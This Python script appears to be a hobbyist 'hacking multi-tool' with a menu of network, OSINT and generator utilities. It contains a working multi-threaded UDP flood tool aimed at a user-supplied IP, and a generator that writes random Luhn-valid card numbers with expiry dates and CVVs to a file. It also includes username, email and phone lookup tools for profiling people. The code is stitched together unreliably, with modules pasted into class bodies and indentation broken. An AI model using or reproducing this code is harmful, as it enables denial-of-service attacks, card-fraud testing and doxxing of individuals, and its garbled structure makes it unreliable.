import os
from colorama import Fore, init
import phonenumbers
import requests
import time
import instaloader

def banner():
    print(Fore.MAGENTA + " ██████╗  ██████╗████████╗ ██████╗ ████████╗ ██████╗  ██████╗ ██╗     ")
    print(Fore.BLUE + "██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     ")
    print(Fore.CYAN + "██║   ██║██║        ██║   ██║   ██║   ██║   ██║   ██║██║   ██║██║     ")
    print(Fore.CYAN + "██║   ██║██║        ██║   ██║   ██║   ██║   ██║   ██║██║   ██║██║     ")
    print(Fore.BLUE + "╚██████╔╝╚██████╗   ██║   ╚██████╔╝   ██║   ╚██████╔╝╚██████╔╝███████╗")
    print(Fore.MAGENTA + " ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝")
    print("")
    print("")
    print("+======================================================================================+")
    print("+  |OS TOOLS|                    |OSINT TOOLS|                    |SCRAPPER TOOLS|     +")
    print("+======================================================================================+")
    print("+  1) Ping IP                    7) Instagram User Tracker        13) Credit Card!     +")                    
    print("+  2) IPCONFIG                   8) Username Tracker              14) Number Scrapper  +")
    print("+  3) Remote Shutdown IP         9) Dos Tool                                           +")
    print("+  4) TraceNet IP                10) Number Info                                       +")
    print("+  5) GeoLocate IP               11) Roblox User Info                                  +")
    print("+  6) Matrix                     12) Email Info                                        +")
    print("+======================================================================================+")

def ping():
        os.system('cls')
        ip = input("Enter IP To Ping: ")
        print(F"PINGING {ip}...")
        time.sleep(1)
        os.system(f'ping {ip}')
        print("")
        time.sleep(1)
        input("Press [ENTER] Key To Continue...")

def ipconfig():
        os.system('cls')
        print("YOUR INFO...")
        time.sleep(1)
        os.system('ipconfig/all')
        print("")
        time.sleep(1)
        input("Press [ENTER] Key To Continue...")

def rsip():
        os.system('cls')
        input("Press [ENTER] Key To Open REMOTE SHUTDOWN Menu...")
        time.sleep(1)
        os.system('shutdown -i')
        print("")
        time.sleep(1)
        input("Press [ENTER] Key To Continue...")

def tracert():
        os.system('cls')
        ip2 = input("Enter IP To TraceNetwork: ")
        print(f"NETRACING {ip2}")
        time.sleep(1)
        print("")
        os.system(f'tracert {ip2}')
        print("")
        time.sleep(1)
        input("Press [ENTER] Key To Continue...")

def geo():
        os.system('cls')
        ip3 = input("Enter IP To GeoLocate: ")
        print(f"GEOLOCATING {ip3}")
        time.sleep(1)
        os.system(f'curl https://ipinfo.io/{ip3}/json')
        time.sleep(1)
        input("Press [ENTER] Key To Continue...")

def matrix():
        os.system('cls')
        os.system('tree')
        os.system('tree')
        os.system('tree')
        os.system('tree')

class insta():
    import os
    import instaloader

    loader = instaloader.Instaloader()

    def clear():
        os.system('cls')

    def handle_error(message):
        print(f"Error: {message}")

    def get_profile_info(username):
        try:
            profile = instaloader.Profile.from_username(loader.context, username)

            print(f"Username: {profile.username}")
            print(f"Name: {profile.full_name}")
            print(f"Bio: {profile.biography}")
            print(f"Followers: {profile.followers}")
            print(f"Following: {profile.followees}")
            print(f"Posts: {profile.mediacount}")
            print(f"Profile Picture URL: {profile.profile_pic_url}")

            for post in profile.get_posts():
                print(f"Post URL: {post.url}")
                print(f"Caption: {post.caption[:100]}")  
                print(f"Likes: {post.likes}")
                print(f"Comments: {post.comments}")
                print()

        except instaloader.exceptions.InstaloaderException as e:
            handle_error(str(e))

    if __name__ == "__main__":
        clear()
        username = input("Enter Instagram username: ")
        get_profile_info(username)

class username():
    import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from deep_translator import GoogleTranslator

def clear():
    print("\033c", end="")

def continue_prompt():
    input("\nPress Enter to continue...")

def only_windows():
    print("This option is only available on Windows.")
    continue_prompt()
    clear()

def only_linux():
    print("This option is only available on Linux.")
    continue_prompt()
    clear()

def error_choice():
    print("Invalid choice. Please select a valid option.")
    continue_prompt()
    clear()

def error_module(e):
    print(f"Error importing module: {e}")
    continue_prompt()
    clear()

def error(e):
    print(f"An error occurred: {e}")
    continue_prompt()
    clear()

def text_translated(text):
    try:
        translated_text = GoogleTranslator(source='auto', target='en').translate(text)
    except Exception as e:
        print(f"Translation error: {e}")
        translated_text = text
    return translated_text

def tiktok_search(driver, username):
    try:
        link = f"https://www.tiktok.com/@{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This account cannot be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def instagram_search(driver, username):
    try:
        link = f"https://instagram.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This page is unfortunately not available" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def giters_search(driver, username):
    try:
        link = f"https://giters.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This page could not be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif username in driver.execute_script("return document.documentElement.innerText"):
            return link
        else:
            return False
    except Exception as e:
        return f"Error: {e}"

def github_search(driver, username):
    try:
        link = f"https://github.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Find code, projects, and people on GitHub" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def paypal_search(driver, username):
    try:
        link = f"https://www.paypal.com/paypalme/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "We cannot find this profile" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "We were not able to process your request. Please try again later" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return "Error: Rate Limit"
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def telegram_search(driver, username):
    try:
        link = f"https://t.me/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "If you have Telegram, you can contact" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "a new era of messaging" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def snapchat_search(driver, username):
    try:
        link = f"https://www.snapchat.com/add/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This content could not be found" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def linktree_search(driver, username):
    try:
        link = f"https://linktr.ee/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "The page you’re looking for doesn’t exist" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def roblox_search(driver, username):
    try:
        link = f"https://www.roblox.com/search/users?keyword={username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "No results available for" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def streamlabs_search(driver, username):
    try:
        link = f"https://streamlabs.com/{username}/tip"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "UNAUTHORIZED" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        elif "401" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def pinterest_search(driver, username):
    try:
        link = f"https://www.pinterest.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Sorry, we couldn’t find any Pins for" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def reddit_search(driver, username):
    try:
        link = f"https://www.reddit.com/user/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "Sorry, nobody on Reddit goes by that name" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def twitter_search(driver, username):
    try:
        link = f"https://twitter.com/{username}"
        driver.get(link)
        driver.implicitly_wait(10)
        time.sleep(2)
        if "This account doesn’t exist" in text_translated(driver.execute_script("return document.documentElement.innerText")):
            return False
        else:
            return link
    except Exception as e:
        return f"Error: {e}"

def main():
    try:
        clear()
        username = input("\nUsername: ")

        print("""
[01] -> Chrome (Linux)
[02] -> Chrome (Windows)
[03] -> Firefox (Windows)
[04] -> Edge (Windows)
        """)
        browser = input("Browser: ")

        if browser in ['1', '01']:
            if sys.platform.startswith("win"):
                only_windows()
            try:
                navigator = "Chrome Linux"
                print(f"Starting {navigator}..")
                chrome_driver_path = os.path.abspath("./Driver/chromedriverlinux")
                chrome_options = webdriver.ChromeOptions()
                chrome_options.add_argument(f"webdriver.chrome.driver={chrome_driver_path}")
                driver = webdriver.Chrome(options=chrome_options)
                print(f"{navigator} Ready!")
            except Exception as e:
                print(f"{navigator} not installed or driver not up to date.")
                continue_prompt()
                clear()
                
        elif browser in ['2', '02']:
            if sys.platform.startswith("linux"):
                only_linux()
            try:
                navigator = "Chrome"
                print(f"Starting {navigator}..")
                driver = webdriver.Chrome()
                print(f"{navigator} Ready!")
            except Exception as e:
                print(f"{navigator} not installed or driver not up to date.")
                continue_prompt()
                clear()

        elif browser in ['3', '03']:
            if sys.platform.startswith("linux"):
                only_linux()
            try:
                navigator = "Firefox"
                print(f"Starting {navigator}..")
                driver = webdriver.Firefox()
                print(f"{navigator} Ready!")
            except Exception as e:
                print(f"{navigator} not installed or driver not up to date.")
                continue_prompt()
                clear()

        elif browser in ['4', '04']:
            if sys.platform.startswith("linux"):
                only_linux()
            try:
                navigator = "Edge"
                print(f"Starting {navigator}..")
                driver = webdriver.Edge()
                print(f"{navigator} Ready!")
            except Exception as e:
                print(f"{navigator} not installed or driver not up to date.")
                continue_prompt()
                clear()
        else:
            error_choice()

        driver.set_window_size(900, 600)

        results = {
            "Tiktok": tiktok_search(driver, username),
            "Instagram": instagram_search(driver, username),
            "Snapchat": snapchat_search(driver, username),
            "Giters": giters_search(driver, username),
            "Github": github_search(driver, username),
            "Paypal": paypal_search(driver, username),
            "Telegram": telegram_search(driver, username),
            "Linktree": linktree_search(driver, username),
            "Roblox": roblox_search(driver, username),
            "Streamlabs": streamlabs_search(driver, username),
            "Pinterest": pinterest_search(driver, username),
            "Reddit": reddit_search(driver, username),
            "Twitter": twitter_search(driver, username)
        }

        print(f"""
The username "{username}" was found:

    Tiktok     : {results.get('Tiktok')}
    Instagram  : {results.get('Instagram')}
    Snapchat   : {results.get('Snapchat')}
    Giters     : {results.get('Giters')}
    Github     : {results.get('Github')}
    Paypal     : {results.get('Paypal')}
    Telegram   : {results.get('Telegram')}
    Linktree   : {results.get('Linktree')}
    Roblox     : {results.get('Roblox')}
    Streamlabs : {results.get('Streamlabs')}
    Pinterest  : {results.get('Pinterest')}
    Reddit     : {results.get('Reddit')}
    Twitter    : {results.get('Twitter')}
        """)

        driver.quit()

        continue_prompt()
    except Exception as e:
        error(e)

if __name__ == "__main__":
    main()

class dos():
    from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
import os
from random import randint
from time import time, sleep
from getpass import getpass as hinput

def clear_screen():
    os.system('cls')

class UDPFlooder:
    def __init__(self, ip, port, packet_size, thread_count):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.thread_count = thread_count

        self.client = socket(AF_INET, SOCK_DGRAM)
        self.packet_data = b"x" * self.packet_size
        self.packet_length = len(self.packet_data)

    def start_flood(self):
        self.is_active = True
        self.sent_bytes = 0
        for _ in range(self.thread_count):
            Thread(target=self.send_packets).start()
        Thread(target=self.monitor_traffic).start()

    def stop_flood(self):
        self.is_active = False

    def send_packets(self):
        while self.is_active:
            try:
                self.client.sendto(self.packet_data, (self.ip, self._get_random_port()))
                self.sent_bytes += self.packet_length
            except Exception as e:
                print(f"Error sending packet: {e}")

    def _get_random_port(self):
        return self.port if self.port else randint(1, 65535)

    def monitor_traffic(self):
        interval = 0.05
        start_time = time()
        total_bytes_sent = 0
        while self.is_active:
            sleep(interval)
            current_time = time()
            if current_time - start_time >= 1:
                speed_mbps = self.sent_bytes * 8 / (1024 * 1024) / (current_time - start_time)
                total_bytes_sent += self.sent_bytes
                print(f"Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb", end='\r')
                start_time = current_time
                self.sent_bytes = 0

def get_input(prompt, default=None, cast_type=int):
    value = input(prompt)
    if value == '':
        return default
    try:
        return cast_type(value)
    except ValueError:
        print(f"Invalid input. Please enter a valid {cast_type.__name__}.")
        return get_input(prompt, default, cast_type)

def main():
    clear_screen()
    ip = input("Enter the target IP address: ")
    if not ip.count('.') == 3:
        print("Error! Please enter a valid IP address.")
        return

    port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
    packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
    thread_count = get_input("Enter the number of threads (default is 100): ", default=100)

    flooder = UDPFlooder(ip, port, packet_size, thread_count)
    
    try:
        flooder.start_flood()
        print(f"Starting attack on {ip}:{port if port else 'all ports'}")
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        flooder.stop_flood()
        print(f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb")

if __name__ == '__main__':
    main()

class num():
    import phonenumbers
import os
from phonenumbers import geocoder, carrier, timezone

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_error(message):
    print(f"Error: {message}")

def main():
    clear()

    try:
        while True:
            phone_number = input("Phone Number: ").strip()
            
            try:
                parsed_number = phonenumbers.parse(phone_number, None)
                if phonenumbers.is_valid_number(parsed_number):
                    if phone_number.startswith("+"):
                        country_code = "+" + phone_number[1:3]
                    else:
                        country_code = "None"
                    operator = carrier.name_for_number(parsed_number, "en")
                    type_number = "Mobile" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Fixed"
                    timezones = timezone.time_zones_for_number(parsed_number)
                    timezone_info = timezones[0] if timezones else "None"
                    country = phonenumbers.region_code_for_number(parsed_number)
                    region = geocoder.description_for_number(parsed_number, "en")
                    status = "Valid"
                    
                    print(f"""
Phone: {phone_number}
Country Code: {country_code}
Country: {country}
Region: {region}
Timezone: {timezone_info}
Operator: {operator}
Type Number: {type_number}
""")
                    
                else:
                    print_error("Invalid format! [Ex: +442012345678 or +33623456789]")

            except Exception as e:
                print_error(f"Exception occurred: {e}")

            choice = input("Do you want to continue? (y/n): ").strip().lower()
            if choice != 'y':
                break

    except Exception as e:
        print_error(f"Error: {e}")

if __name__ == "__main__":
    main()

class rouser():
    import requests
import os
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_error(message):
    print(f"{Colors.red}Error: {message}{Colors.reset}")

def print_info(message):
    print(f"{Colors.red}{message}{Colors.reset}")

def format_value(value, default="Unknown"):
    if value is None:
        return default
    elif isinstance(value, bool):
        return "Yes" if value else "No"
    return value

def Error(e):
    print_error(f"An error occurred: {e}")

def ErrorUsername():
    print_error("Invalid username or unable to retrieve information.")

def main():
    clear()

    while True:
        username = input(f"{Colors.red}\nEnter the username (or 'exit' to quit): {Colors.reset}").strip()

        if username.lower() == 'exit':
            break

        try:
            user_id_response = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}")
            user_id_info = user_id_response.json()

            if user_id_response.status_code != 200 or 'Id' not in user_id_info:
                ErrorUsername()
            else:
                user_id = user_id_info['Id']

                user_info_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
                user_info = user_info_response.json()

                if user_info_response.status_code != 200:
                    ErrorUsername()
                else:
                    userid = format_value(user_info.get('id'))
                    display_name = format_value(user_info.get('displayName'))
                    username = format_value(user_info.get('name'))
                    description = format_value(user_info.get('description'), "Not available")
                    created_at = format_value(user_info.get('created'))
                    is_banned = format_value(user_info.get('isBanned'))
                    external_app_display_name = format_value(user_info.get('externalAppDisplayName'), "Not available")
                    has_verified_badge = format_value(user_info.get('hasVerifiedBadge'))
                    join_date = format_value(user_info.get('created'))

                    groups_response = requests.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles")
                    groups_info = groups_response.json().get('data', [])
                    groups = ", ".join([group['group']['name'] for group in groups_info]) or "No groups"

                    favorites_response = requests.get(f"https://games.roblox.com/v2/users/{user_id}/favorite/games")
                    favorites_info = favorites_response.json().get('data', [])
                    favorite_games = ", ".join([game['name'] for game in favorites_info]) or "No favorite games"

                    info_text = f"""{Colors.red}
Username: {username}
Id: {userid}
Display Name: {display_name}
Description: {description}
Created: {created_at}
Banned: {is_banned}
External Name: {external_app_display_name}
Verified Badge: {has_verified_badge}
Join Date: {join_date}
Groups: {groups}
Favorite Games: {favorite_games}
{Colors.reset}"""

                    print_info(info_text)
                    input(f"{Colors.yellow}Press Enter to continue...{Colors.reset}")

        except Exception as e:
            Error(e)

if __name__ == "__main__":
    main()

class email():
    import subprocess
from emailrep import EmailRep
import re

def clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def handle_error(error_message):
    print(f"Error: {error_message}")

def check_email_with_holehe(email):
    try:
        result = subprocess.run(['holehe', email, '--only-used'], capture_output=True, text=True)
        if result.returncode != 0:
            handle_error("An error occurred while running holehe")
            return

        output_lines = result.stdout.split('\n')
        print(f"\nResults from Holehe for email: {email}\n")
        for line in output_lines:
            match = re.match(r"\[\+\] Email used: .* on (.*)", line)
            if match:
                print(match.group(1))

    except Exception as e:
        handle_error(f"Error executing holehe: {str(e)}")

def get_email_information_with_emailrep(email):
    api = EmailRep()
    try:
        response = api.query(email)
        if response:
            print(f"\nResults from EmailRep.io:")
            print(f"Email: {email}")

            reputation = response.get('reputation', 'N/A')
            details = response.get('details', {})

            print(f"> Reputation: {reputation}")

            if details:
                print(f"Sources: {details.get('sources', 'N/A')}")
                print(f"Account creation date: {details.get('date_creation', 'N/A')}")
                print(f"Last seen: {details.get('last_seen', 'N/A')}")
                print(f"Days since last seen: {details.get('days_since_last_seen', 'N/A')}")
                print(f"Blacklist status: {details.get('blacklisted', 'N/A')}")
                print(f"Malicious status: {details.get('malicious_activity', 'N/A')}")
            else:
                print("Details: N/A")

        else:
            print(f"No information found for {email}")

    except Exception as e:
        handle_error(f"Error querying EmailRep.io: {str(e)}")

def main():
    clear()
    email = input("Enter the email address: ").strip()
    check_email_with_holehe(email)
    get_email_information_with_emailrep(email)
    input("\nPress ENTER to exit...")

if __name__ == "__main__":
    main()

class credit():
    import random
import string
import os

def generate_random_credit_card(brand):
    if brand == "Visa":
        card_number = '4' + ''.join(random.choice(string.digits) for _ in range(15))
    elif brand == "MasterCard":
        card_number = '5' + ''.join(random.choice(string.digits) for _ in range(15)) 
    return card_number

def generate_random_expiry_date():
    month = random.randint(1, 12)
    year = random.randint(2025, 2030)
    return f"{month:02}/{year}"

def generate_random_cvv():
    return ''.join(random.choice(string.digits) for _ in range(3))

def luhn(n):
    r = [int(ch) for ch in str(n)][::-1]
    return (sum(r[0::2]) + sum(sum(divmod(d*2, 10)) for d in r[1::2])) % 10 == 0

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    folder_name = "credit_card_data"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    brands = ["Visa", "MasterCard"]

    valid_file_path = os.path.join(folder_name, "valid_credit_cards.txt")
    invalid_file_path = os.path.join(folder_name, "invalid_credit_cards.txt")

    with open(valid_file_path, "a") as valid_file, open(invalid_file_path, "a") as invalid_file:
        try:
            while True:
                brand = random.choice(brands)
                card_number = generate_random_credit_card(brand)
                expiry_date = generate_random_expiry_date()
                cvv = generate_random_cvv()
                is_valid = luhn(card_number)  
                status = "Valid" if is_valid else "Invalid"
                result = f"{status} - {card_number} ({brand}) - Exp: {expiry_date} - CVV: {cvv}\n"

                if is_valid:
                    valid_file.write(result)
                else:
                    invalid_file.write(result)

                print(result.strip())

        except KeyboardInterrupt:
            print("\nExiting...")

if __name__ == "__main__":
    main()

class numbers():
    import random
import string
import phonenumbers
from phonenumbers import NumberParseException
from pystyle import Colors
import os

operators = {
    "France": [("06", "Orange"), ("07", "SFR"), ("07", "Bouygues"), ("07", "Free")],
}

def generate_phone_number(prefix, length=8):
    number = ''.join(random.choice(string.digits) for _ in range(length))
    return f"{prefix}{number}"

def generate_phone_numbers_with_operators(country):
    prefix, operator = random.choice(operators[country])
    phone_number = generate_phone_number(prefix)
    return {
        "country": country,
        "phone_number": phone_number,
        "operator": operator
    }

def is_valid_phone_number(phone_number, country):
    try:
        parsed_number = phonenumbers.parse(phone_number, country)
        return phonenumbers.is_valid_number(parsed_number)
    except NumberParseException:
        return False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    
    folder_name = "phone_number_data"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    
    country = "France"  
    
    valid_file_path = os.path.join(folder_name, "valid_phone_numbers.txt")
    invalid_file_path = os.path.join(folder_name, "invalid_phone_numbers.txt")

    with open(valid_file_path, "a") as valid_file, open(invalid_file_path, "a") as invalid_file:
        try:
            while True:
                entry = generate_phone_numbers_with_operators(country)
                phone_number = entry['phone_number']
                is_valid = is_valid_phone_number(phone_number, "FR")
                status_color = f"{Colors.green}Valid" if is_valid else f"{Colors.red}Invalid"
                result_color = f"{status_color}{Colors.reset} | {phone_number} ({entry['operator']})"

                status_text = "Valid" if is_valid else "Invalid"
                result_text = f"{status_text} | {phone_number} ({entry['operator']})\n"

                if is_valid:
                    valid_file.write(result_text)
                else:
                    invalid_file.write(result_text)

                print(result_color.strip()) 

        except KeyboardInterrupt:
            print("\nExiting...")

if __name__ == "__main__":
    main()

class back():
    def choice():
        while True:
            banner()
            choice = input("Enter Choice -> ")

            if choice == "1":
                ping()
            elif choice == "2":
                ipconfig()
            elif choice == "3":
                rsip()
            elif choice == "4":
                tracert()
            elif choice == "5":
                geo()
            elif choice == "6":
                matrix()
            elif choice == "7":
                insta()
            elif choice == "8":
                username()
            elif choice == "9":
                dos()
            elif choice == "10":
                num()
            elif choice == "11":
                rouser()
            elif choice == "12":
                email()
            elif choice == "13":
                credit()
            elif choice == "14":
                numbers()